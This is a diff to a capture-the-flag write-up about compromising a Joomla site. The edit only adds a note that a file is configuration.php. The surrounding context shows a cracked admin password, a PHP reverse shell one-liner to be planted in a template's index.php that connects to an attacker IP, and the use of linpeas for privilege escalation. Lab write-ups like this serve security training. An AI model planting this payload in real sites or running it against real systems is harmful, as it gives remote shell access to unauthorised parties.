@@ -92,7 +92,7 @@ So, the password is `spiderman123`
 
 Now that we have access to admin panel of Joomla, we can gain reverse shell by entering `Extensions->Templates->Protostar` and edit `index.php` to include following reverse shell in it: `$sock=fsockopen("10.8.248.211",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);`
 
-We are user `apache`. We can download `linpeas` using local http server (`python3 -m http.server 8080`). A quick look at the results shows this suspicious snippet:
+We are user `apache`. We can download `linpeas` using local http server (`python3 -m http.server 8080`). A quick look at the results shows this suspicious snippet (in `configuration.php`):
 
 ```
 ╔══════════╣ Searching passwords in config PHP files
